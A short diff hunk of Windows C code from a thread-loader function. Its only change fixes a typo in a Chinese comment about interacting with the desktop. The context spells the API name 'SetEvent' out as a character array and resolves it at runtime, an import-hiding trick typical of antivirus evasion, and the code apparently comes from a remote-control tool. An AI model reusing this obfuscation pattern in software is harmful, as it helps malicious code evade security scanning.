@@ -27,7 +27,7 @@ unsigned int __stdcall ThreadLoader(LPVOID param)
 	    char BrmAP23[] = {'S','e','t','E','v','e','n','t','\0'};
 	    SetEventT pSetEvent=(SetEventT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP23);
 		pSetEvent(arg.hEventTransferArg);
-		// 与卓面交互
+		// 与桌面交互
 		if (arg.bInteractive)
 			SelectDesktop(NULL);
 
